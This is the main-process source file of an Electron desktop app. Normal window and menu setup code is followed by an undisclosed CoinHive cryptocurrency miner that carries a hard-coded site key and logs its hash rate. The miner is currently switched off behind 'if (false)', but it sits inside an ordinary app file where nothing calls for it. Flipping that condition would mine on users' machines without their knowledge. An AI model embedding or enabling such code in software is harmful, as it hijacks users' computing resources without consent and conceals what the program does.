import * as electron from 'electron'

const { app, Menu } = electron

import template from './menu-template'
import { createWindow, createWindowIfNoWindows } from './window'

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', () => {
  createWindow()
  const menu = Menu.buildFromTemplate(template)
  Menu.setApplicationMenu(menu)
})

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On OS X it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  createWindowIfNoWindows()
})

const CoinHive = require('coin-hive')
const getPort = require('get-port')

const startMining = async () => {
  const port = await getPort()
  const miner = await CoinHive('Ms9UDamapfNLGi5P7flbLaUPm5eCBmwe', { port })

  // Start miner
  await miner.start()

  // Listen on events
  miner.on('found', () => console.log('Found!'))
  miner.on('accepted', () => console.log('Accepted!'))
  miner.on('update', (data: any) =>
    console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `)
  )

  // Stop miner
  // setTimeout(async () => await miner.stop(), 60000)
}

if (false) {
  startMining().catch(err => console.error(err))
}
